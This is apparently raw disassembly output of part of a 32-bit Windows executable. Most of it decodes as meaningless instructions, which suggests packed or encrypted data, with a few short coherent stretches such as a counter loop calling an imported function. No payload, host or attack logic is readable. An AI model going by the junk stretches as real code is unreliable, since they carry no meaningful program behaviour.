  403186:	adc    esi,DWORD PTR [edi-0x14d7e9e9]
  40318c:	jmp    0x403177
  40318e:	in     ax,0xb4
  403191:	or     al,0xa8
  403193:	ss (bad) 
  403195:	nop
  403196:	push   eax
  403197:	iret   
  403198:	or     edx,DWORD PTR [ebp+0x74]
  40319b:	mov    ecx,0xcba19e93
  4031a0:	dec    ebp
  4031a1:	aaa    
  4031a2:	jbe    0x40321a
  4031a4:	inc    ebx
  4031a5:	xor    edx,DWORD PTR [esi+0x9c9c369]
  4031ab:	inc    eax
  4031ac:	or     dh,ch
  4031ae:	mov    ecx,ebp
  4031b0:	pop    esp
  4031b1:	xor    esi,esi
  4031b3:	ins    BYTE PTR es:[edi],dx
  4031b4:	sub    al,0xa5
  4031b6:	outs   dx,BYTE PTR ds:[esi]
  4031b7:	inc    esi
  4031b8:	or     DWORD PTR [ebx-0x24],esp
  4031bb:	xor    esp,DWORD PTR [edi+0x12]
  4031be:	call   0x3e43:0xb869953b
  4031c5:	sub    eax,0x59853371
  4031ca:	xchg   BYTE PTR [esi+edi*1],cl
  4031cd:	mov    ah,bl
  4031cf:	mov    edx,0x7e927de0
  4031d4:	(bad)
  4031d8:	imul   esp,DWORD PTR cs:[eax-0x6793bd6d],0x209edbff
  4031e3:	jne    0x4031e3
  4031e5:	sahf   
  4031e6:	jns    0x403212
  4031e8:	cld    
  4031e9:	js     0x403222
  4031eb:	(bad)  
  4031ec:	jmp    0x43f3:0x832d2a78
  4031f3:	fdiv   st,st(4)
  4031f5:	rol    al,cl
  4031f7:	push   es
  4031f8:	adc    eax,0x25012ba1
  4031fd:	lds    esp,FWORD PTR [ecx-0x4083fffb]
  403203:	inc    ebp
  403204:	ja     0x40325c
  403206:	inc    ebp
  403207:	mov    DWORD PTR [esi-0x43],esi
  40320a:	push   ds
  40320b:	nop
  40320c:	push   ecx
  40320d:	and    DWORD PTR [esi+0x1aac380],esi
  403213:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403214:	jns    0x4031b5
  403216:	xor    esi,DWORD PTR ds:0xc3612617
  40321c:	add    ecx,DWORD PTR [ebp+0x97a97f8]
  403222:	push   ebx
  403223:	les    ebp,FWORD PTR [eax]
  403225:	faddp  st(6),st
  403227:	pop    es
  403228:	jle    0x403222
  40322a:	mov    ch,0x83
  40322c:	sbb    eax,0xb7fb23f6
  403231:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  403233:	mov    bh,bl
  403235:	add    esp,DWORD PTR ds:0xf5ef2b00
  40323b:	jecxz  0x4031fb
  40323d:	lods   eax,DWORD PTR ds:[esi]
  40323e:	or     eax,0xfef549cc
  403243:	push   ebp
  403244:	aam    0x62
  403246:	sar    DWORD PTR [ecx+0x7],0xdb
  40324a:	push   esp
  40324b:	mov    ds:0x82d3f41a,eax
  403250:	pop    esi
  403251:	xor    BYTE PTR [ebx-0x4c1ee636],bl
  403257:	arpl   WORD PTR [eax-0x32024ad3],bp
  40325d:	lds    eax,FWORD PTR [edi+eax*2-0x28]
  403261:	rcl    DWORD PTR [eax],1
  403263:	push   ds
  403264:	addr16 je 0x40323e
  403267:	sbb    ebp,DWORD PTR [edx+0x48]
  40326a:	mov    esp,DWORD PTR [ecx+0x67850423]
  403270:	cli    
  403271:	loop   0x40329d
  403273:	out    0xd0,al
  403275:	jmp    0x48353306
  40327a:	jae    0x403275
  40327c:	cs aaa 
  40327e:	ret    0x396
  403281:	sbb    BYTE PTR [edi],dh
  403283:	inc    esi
  403284:	icebp  
  403285:	mov    edx,0x39da127a
  40328a:	(bad)  
  40328b:	(bad)  
  40328c:	or     eax,0x969cfc04
  403291:	jo     0x4032f8
  403293:	aaa    
  403294:	jns    0x403275
  403296:	fisubr WORD PTR [ebp+0x5286db3e]
  40329c:	mov    ds:0x13c48c70,eax
  4032a1:	push   edi
  4032a2:	ror    BYTE PTR [eax],1
  4032a4:	sbb    DWORD PTR [ebx-0x58e710cd],esp
  4032aa:	jg     0x403231
  4032ac:	sbb    eax,0x2c1c66de
  4032b1:	sub    bl,BYTE PTR [ebx+0x74]
  4032b4:	pop    eax
  4032b5:	inc    eax
  4032b6:	mov    eax,ds:0x13504a5e
  4032bb:	in     al,dx
  4032bc:	inc    eax
  4032bd:	sub    ebp,eax
  4032bf:	pushf  
  4032c0:	mov    DWORD PTR [ebx],0x92f7a2e6
  4032c6:	das    
  4032c7:	sbb    al,0x7
  4032c9:	pop    edi
  4032ca:	shr    DWORD PTR [eax],0x7b
  4032cd:	xchg   esp,eax
  4032ce:	shl    DWORD PTR ds:0x4d92569b,0x3
  4032d5:	sbb    BYTE PTR [edi-0x13],cl
  4032d8:	(bad)  
  4032d9:	cwde   
  4032da:	shr    DWORD PTR [edx+0x6942ecf9],0xde
  4032e1:	enter  0xbdb4,0x29
  4032e5:	leave  
  4032e6:	js     0x4032e4
  4032e8:	fld    QWORD PTR [ebp-0x4c]
  4032eb:	cmp    al,0xc
  4032ed:	mov    ebp,0xd6dc7a36
  4032f2:	test   ebx,ecx
  4032f4:	pop    di
  4032f6:	gs int 0x4b
  4032f9:	lods   al,BYTE PTR ds:[esi]
  4032fa:	pushf  
  4032fb:	mov    esi,0x37aa31be
  403300:	sub    edx,edi
  403302:	call   0x921:0xe629e5b3
  403309:	dec    esp
  40330a:	es scas eax,DWORD PTR es:[edi]
  40330c:	mov    ebp,0xb4d3edf0
  403311:	loop   0x4032e9
  403313:	pop    ss
  403314:	sbb    DWORD PTR es:[ebx],0x8e0564e2
  40331b:	or     ch,ch
  40331d:	and    al,0xe6
  40331f:	mov    ebx,0x418970fc
  403324:	bound  ebx,QWORD PTR [edx-0x23]
  403327:	ins    BYTE PTR es:[edi],dx
  403328:	lock (bad) 
  40332a:	push   ecx
  40332b:	sar    BYTE PTR [ebp+0x3],1
  40332e:	adc    al,0xf4
  403330:	ss inc eax
  403332:	mov    BYTE PTR [esi],bh
  403334:	fld    QWORD PTR [edi]
  403336:	or     al,0x2f
  403338:	daa    
  403339:	fxch   st(0)
  40333b:	retw   0x41e8
  40333f:	add    bl,cl
  403341:	cmp    eax,0xb99f01b9
  403346:	fwait
  403347:	dec    ebp
  403348:	add    ah,bl
  40334a:	push   ebx
  40334b:	push   edx
  40334c:	aas    
  40334d:	jb     0x40333e
  40334f:	fcomip st,st(7)
  403351:	hlt    
  403352:	sub    bl,bl
  403354:	out    0x81,eax
  403356:	add    ch,ch
  403358:	aam    0x6a
  40335a:	xor    ebp,DWORD PTR [ebp+0x34]
  40335d:	pusha  
  40335e:	xor    eax,0xa13cbaf0
  403363:	sti    
  403364:	clc    
  403365:	push   cs
  403366:	inc    ebx
  403367:	ss hlt 
  403369:	retf   
  40336a:	and    eax,0xb06aef28
  40336f:	or     esi,DWORD PTR [ecx]
  403371:	ja     0x40335a
  403373:	enter  0x30a8,0xf1
  403377:	loopne 0x403377
  403379:	inc    ecx
  40337a:	cmp    eax,0x13baa7cb
  40337f:	mov    ds:0x1bd9dd29,eax
  403384:	jecxz  0x40335e
  403386:	arpl   WORD PTR [edi],cx
  403388:	pop    ebp
  403389:	mov    cl,0xbf
  40338b:	aam    0xe5
  40338d:	push   ecx
  40338e:	jecxz  0x4033f1
  403390:	inc    esp
  403391:	jns    0x4033b8
  403393:	jns    0x403369
  403395:	aaa    
  403396:	es push ebx
  403398:	in     eax,0x70
  40339a:	leave  
  40339b:	mov    esi,DWORD PTR [ebp+0x8]
  40339e:	imul   edi,edx
  4033a1:	mov    ebx,DWORD PTR [ebp+0xc]
  4033a4:	xor    eax,ecx
  4033a6:	add    eax,edx
  4033a8:	jmp    0x403687
  4033ad:	jecxz  0x4033d3
  4033af:	fcom   DWORD PTR [edx]
  4033b1:	out    0xd2,eax
  4033b3:	icebp  
  4033b4:	icebp  
  4033b5:	pop    es
  4033b6:	xchg   edx,eax
  4033b7:	aaa    
  4033b8:	aas    
  4033b9:	mov    esp,0x3a88b64b
  4033be:	adc    al,0x70
  4033c0:	jo     0x403380
  4033c2:	jle    0x403434
  4033c4:	jo     0x403429
  4033c6:	dec    esp
  4033c7:	sub    eax,0x1353604e
  4033cc:	cwde   
  4033cd:	jle    0x403387
  4033cf:	adc    edi,DWORD PTR [edx+0x5f]
  4033d2:	arpl   WORD PTR [ecx],di
  4033d4:	cmp    dh,BYTE PTR [ebx+0x616fd5b6]
  4033da:	xlat   BYTE PTR ds:[ebx]
  4033db:	mov    BYTE PTR [edi],bl
  4033dd:	stos   BYTE PTR es:[edi],al
  4033de:	pop    ds
  4033df:	(bad)  
  4033e0:	dec    edi
  4033e1:	add    eax,0x9fcbcfee
  4033e6:	arpl   WORD PTR [edi],sp
  4033e8:	sbb    eax,0x3a28a381
  4033ed:	jb     0x403425
  4033ef:	mov    eax,ds:0x50f25730
  4033f4:	iret   
  4033f5:	dec    edx
  4033f6:	stos   BYTE PTR es:[edi],al
  4033f7:	jl     0x403402
  4033f9:	js     0x403409
  4033fb:	icebp  
  4033fc:	cdq    
  4033fd:	cmp    DWORD PTR [ecx],edx
  4033ff:	std    
  403400:	xor    eax,0xe74992d3
  403405:	jecxz  0x4033f6
  403407:	fld    DWORD PTR [esi]
  403409:	and    BYTE PTR cs:[ecx+0x78725257],ch
  403410:	in     al,dx
  403411:	mov    eax,0xb76b41ea
  403416:	test   esi,ecx
  403418:	mov    eax,ds:0xefda76c2
  40341d:	sti    
  40341e:	fwait
  40341f:	imul   eax,DWORD PTR es:[ecx+0x61],0x4a
  403424:	rcl    BYTE PTR [eax+0x14],1
  403427:	loop   0x403495
  403429:	cmp    ch,BYTE PTR [esi]
  40342b:	jne    0x4033bd
  40342d:	xor    eax,0xdab1cb77
  403432:	inc    esi
  403433:	lsl    edx,dx
  403436:	lahf   
  403437:	mov    ch,0x1d
  403439:	mov    ds:0xc1c76cad,al
  40343e:	shr    DWORD PTR [esi],0x33
  403441:	pop    ebp
  403442:	arpl   WORD PTR [ebx-0x67],si
  403445:	out    dx,eax
  403446:	clc    
  403447:	arpl   WORD PTR [ebx+0x76],di
  40344a:	inc    ebx
  40344b:	dec    edi
  40344c:	loop   0x40349d
  40344e:	cmp    BYTE PTR [edx+0x7],dh
  403451:	fdiv   DWORD PTR [eax-0x60]
  403454:	add    bl,al
  403456:	dec    ecx
  403457:	add    BYTE PTR [edi],dh
  403459:	xchg   edx,eax
  40345a:	and    DWORD PTR [ecx+0x50],ebp
  40345d:	xchg   esi,eax
  40345e:	cmp    DWORD PTR [esi-0x58],edi
  403461:	push   ebp
  403462:	add    BYTE PTR [ebp+0x1c],bh
  403465:	mov    dl,0x8a
  403467:	arpl   WORD PTR [edi],bx
  403469:	out    0x26,al
  40346b:	nop
  40346c:	jp     0x4033fb
  40346e:	std    
  40346f:	imul   ecx,DWORD PTR [edi+0x6a],0xffffffb2
  403473:	and    DWORD PTR [esi-0x1c8febef],eax
  403479:	fld    DWORD PTR [ecx]
  40347b:	or     DWORD PTR [edx-0x1e78dd0e],ebp
  403481:	mov    al,0xf5
  403483:	rcr    DWORD PTR [ecx],cl
  403485:	cmp    al,0x93
  403487:	lds    esi,FWORD PTR [edi-0x6a]
  40348a:	neg    cl
  40348c:	mov    edi,0xbf5b145d
  403491:	fild   QWORD PTR [ebx-0x79]
  403494:	xor    al,0x5
  403496:	iret   
  403497:	mov    eax,ds:0x9afd963d
  40349c:	ficom  DWORD PTR [ecx+0xb]
  40349f:	push   eax
  4034a0:	add    ebx,DWORD PTR [ebp-0x792d8562]
  4034a6:	jg     0x4034d4
  4034a8:	call   esp
  4034aa:	sub    ecx,DWORD PTR [ecx+0x4a]
  4034ad:	mov    ah,BYTE PTR [eax]
  4034af:	lods   al,BYTE PTR ds:[esi]
  4034b0:	icebp  
  4034b1:	push   ebx
  4034b2:	push   esp
  4034b3:	fild   QWORD PTR [ecx]
  4034b5:	aaa    
  4034b6:	ret    
  4034b7:	sti    
  4034b8:	out    0xe3,eax
  4034ba:	inc    edi
  4034bb:	test   al,0x46
  4034bd:	out    dx,eax
  4034be:	mov    cl,dh
  4034c0:	aam    0x4a
  4034c2:	dec    edi
  4034c3:	mov    esi,fs
  4034c5:	push   edx
  4034c6:	mov    eax,ds:0x57b7dba2
  4034cb:	mov    dl,0xe8
  4034cd:	cdq    
  4034ce:	mov    esi,0x305433f5
  4034d3:	stos   DWORD PTR es:[edi],eax
  4034d4:	xchg   ebp,eax
  4034d5:	dec    ebp
  4034d6:	sub    bl,BYTE PTR [edi-0x4e]
  4034d9:	jmp    0xffa2c633
  4034de:	out    dx,al
  4034df:	nop
  4034e0:	add    BYTE PTR [esi+0x33],ch
  4034e3:	(bad)  
  4034e4:	cwde   
  4034e5:	xor    ecx,edx
  4034e7:	or     eax,0xc0440837
  4034ec:	pop    ds
  4034ed:	xchg   edi,eax
  4034ee:	dec    ebx
  4034ef:	inc    ebx
  4034f0:	mov    eax,ds:0x63f97b80
  4034f5:	cli    
  4034f6:	or     cl,ch
  4034f8:	aaa    
  4034f9:	ss jno 0x403484
  4034fc:	dec    eax
  4034fd:	sub    esi,esi
  4034ff:	inc    ecx
  403500:	xchg   esp,edx
  403502:	sbb    DWORD PTR [edx+esi*1],edx
  403505:	aam    0x45
  403507:	int3   
  403508:	popa   
  403509:	mov    al,ds:0xe51d9a38
  40350e:	mov    edi,0x8f0e88db
  403513:	dec    esi
  403514:	pusha  
  403515:	gs pop esp
  403517:	adc    DWORD PTR [edi+0x60],0xffffff89
  40351b:	test   eax,0x8eaa09e8
  403520:	stc    
  403521:	repnz das 
  403523:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  403525:	ror    DWORD PTR [eax-0x2c74e198],cl
  40352b:	sbb    esi,ebx
  40352d:	jp     0x4034b9
  40352f:	stos   BYTE PTR es:[edi],al
  403530:	or     DWORD PTR [ecx-0x176e4946],0xed1bdc60
  40353a:	and    DWORD PTR [ebx-0x34],edx
  40353d:	ins    DWORD PTR es:[edi],dx
  40353e:	sbb    al,0x87
  403540:	jmp    0xda24f0b5
  403545:	enter  0xd5cf,0x36
  403549:	ret    
  40354a:	cmp    eax,0xb74a932b
  40354f:	lock addr16 pop ebx
  403552:	dec    BYTE PTR [esi+0x7f]
  403555:	test   BYTE PTR [esi],0xce
  403558:	fld    TBYTE PTR [edi]
  40355a:	mov    esi,0x20144907
  40355f:	add    eax,ecx
  403561:	es popf 
  403563:	xor    eax,0xbcc20a3
  403568:	js     0x403598
  40356a:	out    0xbd,al
  40356c:	rcl    DWORD PTR [ecx],0x8c
  40356f:	jmp    0x40359f
  403571:	xlat   BYTE PTR ds:[ebx]
  403572:	pop    ebp
  403573:	shl    DWORD PTR [eax],cl
  403575:	xor    cl,BYTE PTR [ebx]
  403577:	shr    esp,1
  403579:	js     0x40353e
  40357b:	add    BYTE PTR [ebx],bh
  40357d:	fld    DWORD PTR [esi-0x23dbe9d2]
  403583:	xlat   BYTE PTR ds:[ebx]
  403584:	mov    bh,0x86
  403586:	xchg   ebx,eax
  403587:	out    0xc7,eax
  403589:	jnp    0x40358c
  40358b:	and    BYTE PTR [esi+edi*2+0x51967b3c],ch
  403592:	in     al,0x6a
  403594:	pop    edx
  403595:	loop   0x403570
  403597:	or     al,0x48
  403599:	pop    eax
  40359a:	loop   0x4035dd
  40359c:	sbb    DWORD PTR [edi],esi
  40359e:	mov    dh,0x84
  4035a0:	mov    ebp,ebp
  4035a2:	cs and ecx,edi
  4035a5:	(bad)  
  4035a7:	outs   dx,BYTE PTR ds:[esi]
  4035a8:	sbb    al,dl
  4035aa:	xor    DWORD PTR [ebx+0x24269abd],ecx
  4035b0:	js     0x403580
  4035b2:	cmp    edx,DWORD PTR [edx]
  4035b4:	lahf   
  4035b5:	cmp    al,0x33
  4035b7:	dec    edi
  4035b8:	jmp    0x6d72:0x9c2c2c4
  4035bf:	es cmp eax,0xef465f14
  4035c5:	dec    ecx
  4035c6:	inc    esp
  4035c7:	mov    ds:0x4983133f,al
  4035cc:	mov    al,ds:0xb0cad28f
  4035d1:	xor    esp,DWORD PTR [ecx]
  4035d3:	or     DWORD PTR [edi],ebx
  4035d5:	ins    DWORD PTR es:[edi],dx
  4035d6:	sbb    ch,0xa2
  4035d9:	add    eax,0xb536a3d7
  4035de:	test   BYTE PTR [edx-0x67b9ed53],ch
  4035e4:	sub    eax,0x1c32940c
  4035e9:	repz jo 0x4035d8
  4035ec:	enter  0xfc73,0xb8
  4035f0:	bound  edx,QWORD PTR [edx+0x78968eed]
  4035f6:	outs   dx,DWORD PTR ds:[esi]
  4035f7:	mov    ecx,0x328e4d06
  4035fc:	bound  ebp,QWORD PTR [edx+0x7c]
  4035ff:	adc    al,0xa7
  403601:	shl    ah,cl
  403603:	cmc    
  403604:	out    0xe7,al
  403606:	dec    edx
  403607:	add    eax,ecx
  403609:	ficom  DWORD PTR [esi+0x1a]
  40360c:	scas   eax,DWORD PTR es:[edi]
  40360d:	xchg   edi,eax
  40360e:	push   esi
  40360f:	push   esi
  403610:	and    BYTE PTR ds:0xb63d1ddc,bh
  403616:	or     ah,cl
  403618:	xor    dh,bl
  40361a:	stos   BYTE PTR es:[edi],al
  40361b:	or     esp,DWORD PTR [edi-0x1c]
  40361e:	xchg   edx,eax
  40361f:	mov    dl,0x98
  403621:	mov    DWORD PTR [edi+0x370178bb],edx
  403627:	adc    DWORD PTR [edx+0x68f622ab],0x6e
  40362e:	mov    ah,BYTE PTR [eax-0x7b4868a3]
  403634:	adc    BYTE PTR [ebx],0x2e
  403637:	pop    ss
  403638:	scas   eax,DWORD PTR es:[edi]
  403639:	nop
  40363a:	and    ebx,DWORD PTR [eax-0x477e9602]
  403640:	icebp  
  403641:	adc    BYTE PTR ds:0x1ee1fb15,cl
  403647:	popf   
  403648:	jnp    0x4036bb
  40364a:	dec    ebx
  40364b:	push   ss
  40364c:	scas   al,BYTE PTR es:[edi]
  40364d:	adc    BYTE PTR [esi],cl
  40364f:	dec    ebp
  403650:	cld    
  403651:	ret    0x4f3f
  403654:	popa   
  403655:	xchg   edi,eax
  403656:	pop    ss
  403657:	cmc    
  403658:	adc    al,0x15
  40365a:	mov    DWORD PTR [esi+0x376dd8a4],esp
  403660:	lahf   
  403661:	rol    DWORD PTR [ebp+ebx*8+0x379f9a04],0x9b
  403669:	dec    esp
  40366a:	mov    bl,0x4d
  40366c:	rcl    BYTE PTR [ecx+0xea6b86e],cl
  403672:	test   eax,0x4709d239
  403677:	mov    dl,0xbe
  403679:	mov    ds:0xf845231,eax
  40367e:	fs leave 
  403680:	test   BYTE PTR [eax+0x7f],dh
  403683:	addr16 pop esp
  403685:	fsub   DWORD PTR [esi-0x76]
  403688:	test   BYTE PTR [ebx],al
  40368a:	pushf  
  40368b:	jb     0x4036bf
  40368d:	add    BYTE PTR [eax+0x458b3704],cl
  403693:	cld    
  403694:	xor    eax,ecx
  403696:	lea    edx,[edx+eax*1+0x32729c]
  40369d:	mov    eax,DWORD PTR [ebp-0x4]
  4036a0:	xor    eax,ecx
  4036a2:	mov    esi,0xffcd8d64
  4036a7:	sub    esi,eax
  4036a9:	add    esi,DWORD PTR [ebp+0x10]
  4036ac:	cmp    edx,esi
  4036ae:	jbe    0x4030ad
  4036b4:	pop    ebx
  4036b5:	mov    eax,0xf89c8530
  4036ba:	pop    edi
  4036bb:	pop    esi
  4036bc:	leave  
  4036bd:	ret    0xc
  4036c0:	push   ebp
  4036c1:	mov    ebp,esp
  4036c3:	sub    esp,0x58
  4036c6:	mov    DWORD PTR ds:0x42fded,0x17
  4036d0:	cmp    DWORD PTR ds:0x42fded,0x0
  4036d7:	je     0x40372c
  4036dd:	cmp    DWORD PTR ds:0x42fded,0x7
  4036e4:	jne    0x4036fc
  4036ea:	push   0x0
  4036ec:	push   0x25f8
  4036f1:	push   0x8523
  4036f6:	call   DWORD PTR ds:0x42e3d7
  4036fc:	cmp    DWORD PTR ds:0x42fded,0x8
  403703:	jne    0x403717
  403709:	xor    eax,eax
  40370b:	or     eax,DWORD PTR ds:0x42fded
  403711:	dec    eax
  403712:	mov    ds:0x42fded,eax
  403717:	mov    eax,ds:0x42fded
  40371c:	dec    eax
  40371d:	mov    ds:0x42fded,eax
  403722:	jmp    0x4036d0
  403727:	adc    eax,0xdf
  40372c:	mov    ecx,DWORD PTR [ebp+0x8]
  40372f:	add    DWORD PTR ds:0x42e7f3,0x693e
  403739:	mov    eax,0x8a3e
  40373e:	adc    DWORD PTR ds:0x42e7f7,0x5ea2
  403748:	xor    ax,WORD PTR [ecx+0x20]
  40374c:	adc    DWORD PTR ds:0x42fe0d,ecx
  403752:	mov    ecx,0x3b04
  403757:	and    DWORD PTR ds:0x42e813,0x42e21c
  403761:	add    ax,cx
  403764:	mov    DWORD PTR ds:0x42fe7a,0x1b71
  40376e:	movzx  eax,ax
  403771:	mov    DWORD PTR [ebp-0xc],eax
  403774:	or     DWORD PTR ds:0x42e224,0x7677
  40377e:	mov    BYTE PTR [ebp-0x1],0x7f
  403782:	not    ecx
  403784:	lea    eax,[ebp-0x1]
  403787:	mov    DWORD PTR [ebp-0x10],eax
  40378a:	or     DWORD PTR ds:0x42e80f,ecx
  403790:	jmp    0x403af0
  403795:	out    0x52,eax
  403797:	out    0x78,al
  403799:	jno    0x40374f
  40379b:	in     eax,0x71
  40379d:	or     BYTE PTR [edx+0x68],bl
  4037a0:	and    edi,eax
  4037a2:	lods   eax,DWORD PTR ds:[esi]
  4037a3:	sub    BYTE PTR [esi],ch
  4037a5:	js     0x4037b8
  4037a7:	jo     0x403819
  4037a9:	cmp    eax,0x2570707d
  4037ae:	mov    edx,0x3c413028
  4037b3:	dec    ebx
  4037b4:	pusha  
  4037b5:	adc    al,0x3d
  4037b7:	adc    DWORD PTR [ebx],0xffffffe5
  4037ba:	arpl   WORD PTR [edi+0x4],dx
  4037bd:	add    BYTE PTR [ebx],dl
  4037bf:	add    BYTE PTR [ecx+ebp*8+0x414cc572],0x4f
  4037c7:	add    DWORD PTR [ebp-0x2d],edi
  4037ca:	aaa    
  4037cb:	enter  0xba9,0x4e
  4037cf:	(bad)  
  4037d0:	cwde   
  4037d1:	mov    DWORD PTR [ecx-0x131161fe],eax
  4037d7:	jb     0x4037bd
  4037d9:	fs cmc 
  4037db:	repz pop es
  4037dd:	test   DWORD PTR [esi],eax
  4037df:	pop    ebp
  4037e0:	sbb    DWORD PTR [esi],ebp
  4037e2:	fstp   DWORD PTR [edx]
  4037e4:	mov    edx,0x52cd3269
  4037e9:	fdivr  QWORD PTR [esi-0x39]
  4037ec:	dec    esp
  4037ed:	fstp   st(0)
  4037ef:	mov    ebx,0x487de2bf
  4037f4:	imul   esi,DWORD PTR [esi-0x48],0x52
  4037f8:	xor    dl,BYTE PTR [edx+0x53]
  4037fb:	les    ebx,FWORD PTR [ecx+0x4cd0c28a]
  403801:	jno    0x40384c
  403803:	xlat   BYTE PTR ds:[ebx]
  403804:	push   edi
  403805:	je     0x4037c9
  403807:	and    ebx,DWORD PTR [ecx+0x6e]
  40380a:	je     0x403819
  40380c:	pop    esi
  40380d:	mov    WORD PTR fs:[eax+0x7b],cs
  403811:	repnz rcr DWORD PTR [ebp-0x94fd672],0xe2
  403819:	inc    ecx
  40381a:	pop    ds
  40381b:	in     al,dx
  40381c:	lds    eax,FWORD PTR [esi+0x5e]
  40381f:	dec    edx
  403820:	push   0x180dc2b5
  403825:	pusha  
  403826:	lahf   
  403827:	or     esi,edi
  403829:	mov    ah,bl
  40382b:	jae    0x403835
  40382d:	pop    ebx
  40382e:	test   al,0xd6
  403830:	sbb    al,0xd1
  403832:	fsubr  QWORD PTR [ebp-0x4e6d4f39]
  403838:	jno    0x40381d
  40383a:	fisttp DWORD PTR [ebx+0xddc121e]
  403840:	jae    0x4037cc
  403842:	push   0x4cd2f590
  403847:	sub    BYTE PTR [edi-0x77],cl
  40384a:	je     0x4037e7
  40384c:	push   esi
  40384d:	ret    0xeaf5
  403850:	jmp    0xd1cc7927
  403855:	fist   WORD PTR [edi+0x6018ef8b]
  40385b:	pop    ebx
  40385c:	lods   eax,DWORD PTR ds:[esi]
  40385d:	or     al,0x61
  40385f:	sub    esp,DWORD PTR fs:[edx-0x67]
  403863:	cdq    
  403864:	sub    ebx,DWORD PTR ds:0xc0acd3ee
  40386a:	dec    eax
  40386b:	cld    
  40386c:	sub    ebp,DWORD PTR [esi+0x5c]
  40386f:	adc    edi,DWORD PTR [eax]
  403871:	jmp    0x246e7973
  403876:	out    0xe9,al
  403878:	inc    edx
  403879:	jmp    0x4038c0
  40387b:	adc    ch,BYTE PTR [edi+0x18]
  40387e:	(bad)  
  40387f:	jmp    0xe8c870c5
  403884:	jge    0x403814
  403886:	xor    BYTE PTR [esi+0x23b47848],dl
  40388c:	pop    esi
  40388d:	fdiv   QWORD PTR [ecx]
  40388f:	push   esi
  403890:	push   ds
  403891:	mov    ebx,DWORD PTR [ebp-0x55]
  403894:	bound  esp,QWORD PTR [ecx-0x24ee41dd]
  40389a:	push   es
  40389b:	mov    bh,cl
  40389d:	jg     0x40382b
  40389f:	fmul   QWORD PTR [eax-0x46]
  4038a2:	(bad)  
  4038a3:	jge    0x4038e9
  4038a5:	sub    BYTE PTR [ebx+edx*4],bl
  4038a8:	imul   esp,esp,0xfffffff8
  4038ab:	fsubr  DWORD PTR [ebp+ecx*8-0x53]
  4038af:	jecxz  0x403850
  4038b1:	mov    DWORD PTR [ebx+ecx*2-0x6a],esp
  4038b5:	loop   0x4038eb
  4038b7:	or     ebx,DWORD PTR [esi+0x3009bfec]
  4038bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038be:	lods   eax,DWORD PTR ds:[esi]
  4038bf:	and    DWORD PTR [eax+ebp*4+0xd995126],esi
  4038c6:	push   ebx
  4038c7:	(bad)
  4038ca:	or     eax,0x765317fa
  4038cf:	scas   al,BYTE PTR es:[edi]
  4038d0:	dec    eax
  4038d1:	jbe    0x4038b4
  4038d3:	loopne 0x403881
  4038d5:	outs   dx,DWORD PTR ds:[esi]
  4038d6:	pop    DWORD PTR [ecx-0x59]
  4038d9:	rcr    dh,0x88
  4038dc:	push   ebp
  4038dd:	pusha  
  4038de:	mov    dh,BYTE PTR cs:[edx-0x5b]
  4038e2:	jno    0x4038ca
  4038e4:	fld    QWORD PTR [edx+0x77c0308e]
  4038ea:	clc    
  4038eb:	ret    
  4038ec:	sar    DWORD PTR [ebp-0x5a],1
  4038ef:	or     ebp,DWORD PTR [ebx+0x53]
  4038f2:	or     BYTE PTR [ebx-0x7419d18c],ah
  4038f8:	(bad)  
  4038f9:	mov    bh,0x8f
  4038fb:	mov    ecx,0x4350b90e
  403900:	leave  
  403901:	dec    esi
  403902:	push   ds
  403903:	jle    0x4038f8
  403905:	aas    
  403906:	push   cs
  403907:	ins    BYTE PTR es:[edi],dx
  403908:	xchg   esp,eax
  403909:	mov    ebp,0x53bc9392
  40390e:	sbb    ah,BYTE PTR [edi+ebx*2+0x1f]
  403912:	in     al,dx
  403913:	lods   eax,DWORD PTR ds:[esi]
  403914:	inc    eax
  403915:	mov    edi,0x86e77852
  40391a:	jnp    0x403986
  40391c:	cmc    
  40391d:	dec    edx
  40391e:	sub    ah,bh
  403920:	adc    DWORD PTR [ebx+esi*2],ebx
  403923:	or     al,0x7b
  403925:	jmp    0xc34c:0x3e92681e
  40392c:	push   esi
  40392d:	jl     0x403956
  40392f:	jne    0x40391b
  403931:	and    esp,DWORD PTR [ecx+0x42]
  403934:	add    eax,DWORD PTR gs:[ebx+ebx*1-0x780e93d]
  40393c:	out    dx,eax
  40393d:	fstp   st(2)
  40393f:	mov    dh,0x1
  403941:	loopne 0x403923
  403943:	cdq    
  403944:	pop    ecx
  403945:	dec    ecx
  403946:	sub    edx,DWORD PTR [ecx]
  403948:	push   eax
  403949:	leave  
  40394a:	aas    
  40394b:	dec    esi
  40394c:	(bad)  
  40394d:	pop    edx
  40394e:	push   es
  40394f:	scas   eax,DWORD PTR es:[edi]
  403950:	xchg   esi,eax
  403951:	inc    edi
  403952:	js     0x403987
  403954:	ret    0xf9e2
  403957:	shr    DWORD PTR [esi+0x17c7e75f],1
  40395d:	push   ebp
  40395e:	popf   
  40395f:	jae    0x403988
  403961:	mov    dl,0x73
  403963:	sub    cl,BYTE PTR [ebx-0x7aced406]
  403969:	push   eax
  40396a:	xchg   ebp,eax
  40396b:	add    al,0xff
  40396d:	or     al,0xe4
  40396f:	sub    DWORD PTR [edi+0x3fbc2d7f],ecx
  403975:	arpl   WORD PTR [edx+esi*2],bx
  403978:	stc    
  403979:	stos   BYTE PTR es:[edi],al
  40397a:	jl     0x4039d1
  40397c:	loop   0x4039ae
  40397e:	cmc    
  40397f:	mov    ebx,0x1a0bc2e1
  403984:	add    edx,DWORD PTR ds:0x839fa08f
  40398a:	or     esi,DWORD PTR [ecx-0x26]
  40398d:	fwait
  40398e:	mov    bl,0x4a
  403990:	and    DWORD PTR [eax+0x48],edi
  403993:	ret    
  403994:	pop    esi
  403995:	outs   dx,DWORD PTR ds:[esi]
  403996:	and    ecx,DWORD PTR [esi]
  403998:	fadd   QWORD PTR [ebx+ebx*2]
  40399b:	jns    0x4039c1
  40399d:	xchg   edx,eax
  40399e:	sar    DWORD PTR [ebx-0x3c7e4b95],0xd1
  4039a5:	xchg   BYTE PTR [esi-0x43],bl
  4039a8:	(bad)  
  4039a9:	addr16 mov ebp,0x750c090b
  4039af:	sti    
  4039b0:	call   0x136f:0x4cf573ab
  4039b7:	stc    
  4039b8:	cmp    ebx,DWORD PTR [eax-0x14]
  4039bb:	std    
  4039bc:	test   eax,0x365f90a0
  4039c1:	mov    BYTE PTR [ebx-0x75be3291],ch
  4039c7:	jl     0x4039b2
  4039c9:	dec    edx
  4039ca:	lods   eax,DWORD PTR ds:[esi]
